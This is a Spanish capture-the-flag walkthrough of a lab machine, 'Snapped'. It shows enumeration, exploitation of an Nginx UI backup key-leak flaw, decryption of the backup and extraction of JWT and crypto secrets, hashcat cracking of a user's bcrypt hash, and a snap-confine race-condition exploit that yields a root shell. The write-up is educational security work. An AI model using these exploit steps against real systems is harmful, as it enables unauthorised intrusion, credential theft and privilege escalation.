
# Snapped

<figure><img src="/files/oqHeFWrGgTGcrscbDa4U" alt=""><figcaption></figcaption></figure>

## <mark style="color:$primary;">Información General</mark>

* **Nombre de la máquina:** `Snapped`
* **IP:** `10.129.69.133`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🔴 Difícil`
* **Fecha:** `18/05/2026`

***

## <mark style="color:$primary;">Reconocimiento Inicial</mark>

#### Añadimos la IP al /etc/hosts

```bash
sudo echo "10.129.69.133 snapped.htb" | sudo tee -a /etc/hosts
```

### Escaneo de Puertos

#### Escaneo Simple

```bash
sudo nmap -v -sV -T5 10.129.69.133
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Solo encontramos puertos comunes (22 y 80) abiertos. Nos centraremos en el servicio web.

### Acceso Web

Accedemos a `http://snapped.htb` y observamos que parece ser una landing page de una plataforma de infraestructura.

<figure><img src="/files/jKV29Amw9sahMBP71Rou" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:$primary;">Enumeración Web</mark>

### WSTG Scan

{% embed url="<https://github.com/afsh4ck/WSTG-Scan>" %}

Este programa automáticamente realiza:

* Enumeración de tecnologías web
* Escaneo de puertos y servicios con Nmap
* Análisis de vulnerabilidades con Nuclei
* Fuzzing de subdominios con ffuf
* Fuzzing de directorios con fuff
* Spidering / Mapeo completo del site
* Detección de formularios y pruebas de inyección
* Pruebas de API (OWASP API Top 10)
* Enumeración de usuarios y bruteforce con hydra

{% code overflow="wrap" %}

```bash
git clone https://github.com/afsh4ck/WSTG-Scan.git
cd WSTG-Scan
python3 wstg-scan.py
```

{% endcode %}

### Hallazgos relevantes

#### Subdominios (vhosts) encontrados

| Status | VHost             | Tamaño |
| ------ | ----------------- | ------ |
| 200    | admin.snapped.htb | 1407   |

**Encontramos el subdominio:** `admin.snapped.htb`

Lo añadimos a `/etc/hosts` y accedemos para llegar a un login de `Nginx UI`.

<figure><img src="/files/zbNicL8CjJ1tHwhQioLe" alt=""><figcaption></figcaption></figure>

### Enumeración de vhost

Volvemos a ejecutar wstg-scan.py contra el subdominio descubierto y obtenemos los siguientes detos relevantes:

#### Nuclei

Expone 2 CVE críticos:

```bash
[CVE-2026-33032] [http] [critical] http://admin.snapped.htb/mcp_message
[CVE-2026-27944:backup_security_header] [http] [critical] http://admin.snapped.htb/api/backup ["05n3Htt2G48fIMkkqDnciUbiz9/+8TG62il1XXgxRYc=:Emo2HEyTkTKCDCqDqMxBmw=="]
```

Al acceder a <http://admin.snapped.htb/api/backup> nos descarga un backup completo del sitio web.

#### Broken Acces Control

| Severidad | Template       | Nombre                           | URL                                      |
| --------- | -------------- | -------------------------------- | ---------------------------------------- |
| CRITICAL  | CVE-2026-33032 | Nginx UI - Broken Access Control | <http://admin.snapped.htb/mcp\\_message> |

### Análisis de Backup

Encontramos los siguientes archivos al descomprimir:

```bash
ls -la
drwxrwxr-x kali kali 4.0 KB Sun May 17 01:35:47 2026  .
drwxrwxr-x kali kali 4.0 KB Sun May 17 01:41:24 2026  ..
.rw-r--r-- kali kali 208 B  Sun May 17 01:35:35 2026  hash_info.txt
.rw-r--r-- kali kali 7.5 KB Sun May 17 01:35:35 2026  nginx-ui.zip
.rw-r--r-- kali kali 9.7 KB Sun May 17 01:35:35 2026  nginx.zip
```

```bash
file nginx.zip nginx-ui.zip hash_info.txt

nginx.zip:     DOS executable (COM), maybe with interrupt 22h, start instruction 0xeb4b9619 6dba52ca
nginx-ui.zip:  data
hash_info.txt: data
```

El archivo `nginx.zip` se identifica como un ejecutable DOS (COM), lo cual es extraño para un backup. `nginx-ui.zip` y `hash_info.txt` son solo `data`, sin firma mágica conocida. Esto sugiere que los archivos están **cifrados** o **ofuscados** deliberadamente.

### CVE-2026-27944

El backup está cifrado con AES-256-CBC y la clave e IV se entregan en la cabecera `X-Backup-Security`. Los strings que vimos en Nuclei (`05n3Htt2G48fIMkkqDnciUbiz9/+8TG62il1XXgxRYc=:Emo2HEyTkTKCDCqDqMxBmw==`) son **clave:IV** en Base64.

{% embed url="<https://github.com/advisories/GHSA-g9w5-qffc-6762>" %}

### Paso 1: Exploit PoC

Utilizamos el exploit del artículo para darcargar el backup y extraerlo correctamente:

```bash
python decrypt.py --target http://admin.snapped.htb --decrypt

X-Backup-Security: NFqzTKBOkkyt9Ji/1yUu+fXb6FdZLuAOulOl3yhciAk=:zxJhAdqpYDxMedoC2ATqcg==
Parsed AES-256 key: NFqzTKBOkkyt9Ji/1yUu+fXb6FdZLuAOulOl3yhciAk=
Parsed AES IV    : zxJhAdqpYDxMedoC2ATqcg==

[*] Key length: 32 bytes (AES-256 ✓)
[*] IV length : 16 bytes (AES block size ✓)

[*] Extracting encrypted backup to backup_extracted
[*] Main archive contains: ['hash_info.txt', 'nginx-ui.zip', 'nginx.zip']
[*] Decrypting hash_info.txt...
    → Saved to backup_extracted/hash_info.txt.decrypted (199 bytes)
[*] Decrypting nginx-ui.zip...
    → Saved to backup_extracted/nginx-ui_decrypted.zip (7736 bytes)
    → Extracted 2 files to backup_extracted/nginx-ui
[*] Decrypting nginx.zip...
    → Saved to backup_extracted/nginx_decrypted.zip (9936 bytes)
    → Extracted 22 files to backup_extracted/nginx

[*] Hash info:
nginx-ui_hash: 0a52f6d93ced524a59326f0953994910e4ac83a8041c57d62166d2e7f7c5709d
nginx_hash: 6febea0f4083096e5779353278db986c4a94069a9a13332bfcb472765da6067f
timestamp: 20260516-142313
version: 2.3.2
```

Eso nos genera la carpeta `backup_extracted` con los archivos listos para extraer:

```bash
ls
 hash_info.txt   hash_info.txt.decrypted   nginx   nginx-ui   nginx-ui.zip   nginx-ui_decrypted.zip   nginx.zip   nginx_decrypted.zip
```

```bash
cat hash_info.txt.decrypted 
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: hash_info.txt.decrypted
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ nginx-ui_hash: 0a52f6d93ced524a59326f0953994910e4ac83a8041c57d62166d2e7f7c5709d
   2   │ nginx_hash: 6febea0f4083096e5779353278db986c4a94069a9a13332bfcb472765da6067f
   3   │ timestamp: 20260516-142313
   4   │ version: 2.3.2
```

```bash
unzip nginx-ui_decrypted.zip 
Archive:  nginx-ui_decrypted.zip
  inflating: app.ini                 
  inflating: database.db 
```

```bash
unzip nginx_decrypted.zip 
Archive:  nginx_decrypted.zip
   creating: conf.d/
  inflating: fastcgi.conf            
  inflating: fastcgi_params          
  inflating: koi-utf                 
  inflating: koi-win                 
  inflating: mime.types              
   creating: modules-available/
   creating: modules-enabled/
  inflating: nginx.conf              
  inflating: proxy_params            
  inflating: scgi_params             
   creating: sites-available/
  inflating: sites-available/nginx-ui  
  inflating: sites-available/snapped  
   creating: sites-enabled/
  inflating: sites-enabled/nginx-ui  -> /etc/nginx/sites-available/nginx-ui 
  inflating: sites-enabled/snapped   -> /etc/nginx/sites-available/snapped 
   creating: snippets/
  inflating: snippets/fastcgi-php.conf  
  inflating: snippets/snakeoil.conf  
  inflating: uwsgi_params            
  inflating: win-utf                 
finishing deferred symbolic links:
  sites-enabled/nginx-ui -> /etc/nginx/sites-available/nginx-ui
  sites-enabled/snapped  -> /etc/nginx/sites-available/snapped
```

### Examinar archivo de configuración

```bash
cat nginx-ui/app.ini

[server]
RunMode           = release
HttpPort          = 9000
HTTPChallengePort = 9180
Host              = 127.0.0.1
Port              = 9000
BaseUrl           = 
EnableHTTPS       = false
SSLCert           = 
SSLKey            = 
EnableH2          = false
EnableH3          = false

[nginx]
ConfigDir       = /etc/nginx
BinaryPath      = /usr/sbin/nginx
AccessLogPath   = /var/log/nginx/access.log
ErrorLogPath    = /var/log/nginx/error.log
LogDirWhiteList = 
ConfigPath      = 
PIDPath         = 
SbinPath        = 
TestConfigCmd   = 
ReloadCmd       = 
RestartCmd      = 
StubStatusPort  = 0
ContainerName   = 

[database]
Path = /var/lib/nginx-ui/database.db
Name = database

[app]
PageSize  = 20
JwtSecret = 6c4af436-035a-4942-9ca6-172b36696ce9

[log]
EnableFileLog = false
Dir           = 
MaxSize       = 0
MaxAge        = 0
MaxBackups    = 0
Compress      = false

[sls]
AccessKeyId         = 
AccessKeySecret     = 
EndPoint            = 
ProjectName         = 
APILogStoreName     = 
DefaultLogStoreName = 
Source              = 

[auth]
IPWhiteList         = 
BanThresholdMinutes = 10
MaxAttempts         = 10

[backup]
GrantedAccessPath = 

[casdoor]
Endpoint        = 
ExternalUrl     = 
ClientId        = 
ClientSecret    = 
CertificatePath = 
Organization    = 
Application     = 
RedirectUri     = 

[cert]
RecursiveNameservers = 
Email                = admin@test.htb
CADir                = 
RenewalInterval      = 7
HTTPChallengePort    = 9180

[cluster]
Node = 

[crypto]
Secret = 5c942292647d73f597f47c0be2237bf7347cdb70a0e8e8558e448318862357d6

[http]
GithubProxy        = 
InsecureSkipVerify = false

[logrotate]
Enabled  = false
CMD      = logrotate /etc/logrotate.d/nginx
Interval = 1440

[nginx_log]
IndexingEnabled          = false
IndexPath                = 
IncrementalIndexInterval = 0

[node]
Name                 = 
Secret               = c64d7ca1-19cb-4ebe-96d4-49037e7df78e
SkipInstallation     = false
Demo                 = false
ICPNumber            = 
PublicSecurityNumber = 

[openai]
BaseUrl              = 
Token                = 
Proxy                = 
Model                = 
APIType              = OPEN_AI
EnableCodeCompletion = false
CodeCompletionModel  = 

[terminal]
StartCmd = login

[webauthn]
RPDisplayName = 
RPID          = 
RPOrigins     = 
```

Obtenemos:

* JwtSecret = 6c4af436-035a-4942-9ca6-172b36696ce9
* Secret (crypto) = 5c942292647d73f597f47c0be2237bf7347cdb70a0e8e8558e448318862357d6
* Node secret = c64d7ca1-19cb-4ebe-96d4-49037e7df78e

### Enumerar base de datos

#### Obtener tablas

```bash
sqlite3 nginx-ui/database.db ".tables"

acme_users         configs            namespaces         sites            
auth_tokens        dns_credentials    nginx_log_indices  streams          
auto_backups       dns_domains        nodes              upstream_configs 
ban_ips            external_notifies  notifications      users            
certs              llm_sessions       passkeys         
config_backups     migrations         site_configs
```

#### Enumerar tabla users

```
sqlite3 nginx-ui/database.db "SELECT * FROM users;" 

1|2026-03-19 08:22:54.41011219-04:00|2026-03-19 08:39:11.562741743-04:00||admin|$2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm|1||g�
2|2026-03-19 09:54:01.989628406-04:00|2026-03-19 09:54:01.989628406-04:00||jonathan|$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq|1||,��զ�H�։��e)5U��Z��KĦ"D���W|en
```

Tenemos dos usuarios (`admin` y `jonathan`) con hashes bcrypt.

### Cracking de hashes

Solo conseguimos crackear el hash de jonathan:

```bash
echo '$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq' > jonathan.hash
```

```bash
hashcat -m 3200 jonathan.hash /usr/share/wordlists/rockyou.txt -O

$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq:linkinpark
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2...oCSyWq
Time.Started.....: Sun May 17 02:35:34 2026 (2 secs)
Time.Estimated...: Sun May 17 02:35:36 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      237 H/s (3.88ms) @ Accel:16 Loops:4 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 512/14344385 (0.00%)
```

Tenemos la contraseña en plano: `linkinpark`

***

## <mark style="color:$primary;">Acceso Inicial</mark>

Accedemos por SSH como jonathan sin problema:

```bash
ssh jonathan@snapped.htb        
                                          
The authenticity of host 'snapped.htb (10.129.69.133)' can't be established.
ED25519 key fingerprint is SHA256:n0XlQQqHGczclhalpCeoOZDYQGr7rl3WlJytHLWPkr8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'snapped.htb' (ED25519) to the list of known hosts.
jonathan@snapped.htb's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.17.0-19-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

1 update can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Fri Mar 20 12:27:50 2026 from 10.10.14.5

jonathan@snapped:~$ whoami
jonathan
```

***

## <mark style="color:$primary;">User Flag</mark>

```bash
jonathan@snapped:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  snap  Templates  user.txt  Videos

jonathan@snapped:~$ cat user.txt 
32f9f8d3a8144bc7b6f7943b0********
```

***

## <mark style="color:$primary;">Escalada de Privilegios</mark>

### Enumeración de Privilegios

No tenemos sudo como el usuario Jonathan:

```bash
jonathan@snapped:~$ sudo -l
[sudo] password for jonathan: 
Sorry, user jonathan may not run sudo on snapped.
```

### Enumeración de archivos con permisos especiales

Buscando archivos con permisos especiales, encontramos un archivo sospechoso `snap-confine`:

```bash
jonathan@snapped:~$ find / -user root -perm -4000 -print 2>/dev/null

/snap/snapd/21759/usr/lib/snapd/snap-confine
/snap/core22/1564/usr/bin/chfn
/snap/core22/1564/usr/bin/chsh
/snap/core22/1564/usr/bin/gpasswd
/snap/core22/1564/usr/bin/mount
<---SNIP--->
```

### Enumeración de Snap

#### Versión

```bash
jonathan@snapped:/tmp$ snap version
snap    2.63.1+24.04
snapd   2.63.1+24.04
series  16
ubuntu  24.04
kernel  6.17.0-19-generic
```

#### Listado de Snaps

```bash
jonathan@snapped:/tmp$ snap list
Name                       Version          Rev    Tracking         Publisher   Notes
bare                       1.0              5      latest/stable    canonical✓  base
core22                     20240731         1564   latest/stable    canonical✓  base
firefox                    129.0.2-1        4793   latest/stable/…  mozilla✓    -
firmware-updater           0+git.5007558    127    1/stable/…       canonical✓  -
gnome-42-2204              0+git.510a601    176    latest/stable/…  canonical✓  -
gtk-common-themes          0.1-81-g442e511  1535   latest/stable/…  canonical✓  -
snap-store                 0+git.e3dd562    1173   2/stable/…       canonical✓  -
snapd                      2.63             21759  latest/stable    canonical✓  snapd
snapd-desktop-integration  0.9              178    latest/stable/…  canonical✓  -
```

### Explotación de Snap Confine

Encontramos que snap confine es vulnerable al CVE-2026-3888:

{% embed url="<https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE>" %}

#### Verificar versión vuilnerable de snap

```bash
snap version
# snapd 2.63.1+24.04 — vulnerable (fixed in 2.73)
```

#### Comprobar versión de Kernel

Observamos qye tenemos un `Linux Snapped 6.17.0`, corriendo un `Ubuntu 24.04`, y en el exploit nos indica justo esa versión, que apunta al target snap `firefox` que encontramos antes:

```bash
jonathan@snapped:/tmp$ uname -a
Linux snapped 6.17.0-19-generic #19~24.04.2-Ubuntu SMP PREEMPT_DYNAMIC Fri Mar  6 23:08:46 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
```

<figure><img src="/files/y5Tr7xn5ntOEFApGOF1R" alt=""><figcaption></figcaption></figure>

#### Descarga y compilación en Kali

```bash
git clone https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE.git
cd CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE 
```

```bash
gcc -O2 -static -o exploit exploit_suid.c
gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell_suid.c
```

#### Envío a la máquina

```bash
scp exploit jonathan@snapped.htb:/tmp/
scp librootshell.so jonathan@snapped.htb:/tmp/
```

#### Ejecutar el exploit

Debemos tener 2 sesiones abiertas para ejecutar el exploit correctamente:

```bash
# Session 1 — Ejecutar exploit
cd /tmp
./exploit ./librootshell.so

# Session 2 — Trigger cleanup cuando veas el mensaje "Polling..."
rm -rf /tmp/.snap
```

Al terminar de ejecutarse el exploit en la session 1 obtenemos una shell como root:

```bash
jonathan@snapped:~$ ./exploit ./librootshell.so

================================================================
    CVE-2026-3888 — snap-confine / systemd-tmpfiles SUID LPE
================================================================
[*] Payload: /home/jonathan/./librootshell.so (9056 bytes)

[Phase 1] Entering Firefox sandbox...
[+] Inner shell PID: 89479

[Phase 2] Waiting for .snap deletion...
[*] Polling (up to 30 days on stock Ubuntu).
[*] Hint: use -s to skip.
[+] .snap deleted.

[Phase 3] Destroying cached mount namespace...
cannot perform operation: mount --rbind /dev /tmp/snap.rootfs_WHq6BZ//dev: No such file or directory
[+] Namespace destroyed.

[Phase 4] Setting up and running the race...
[*]   Working directory: /proc/89479/cwd
[*]   Building .snap and .exchange...
[*]   285 entries copied to exchange directory
[*]   Starting race...
[*]   Monitoring snap-confine (child PID 89882)...

[!]   TRIGGER — swapping directories...
[+]   SWAP DONE — race won!
[*]   ld-linux in namespace: jonathan:jonathan 755
[+]   Poisoned namespace PID: 89882

[Phase 5] Injecting payload into poisoned namespace...
[+]   ld-linux owned by uid 1000 (attacker). Race confirmed.
[*]   Planting busybox...
[*]   Writing escape script → /tmp/sh
[*]   Overwriting ld-linux-x86-64.so.2...
[+]   Payload injected.

[Phase 6] Triggering root via SUID snap-confine...
[*]   snap-confine → snap-confine (SUID trigger)
[*]   Exit status: 0

[Phase 7] Verifying...
[+] SUID root bash: /var/snap/firefox/common/bash (mode 4755)
[*] Cleaning up background processes...

================================================================
  ROOT SHELL: /var/snap/firefox/common/bash -p
================================================================

bash-5.1# whoami
root
```

***

## <mark style="color:$primary;">👑</mark> <mark style="color:$primary;">Root Flag</mark>

```bash
bash-5.1# cd /root

bash-5.1# ls
nginxui  root.txt  snap

bash-5.1# cat root.txt 
0d0524873d9dde7065e59846********
```
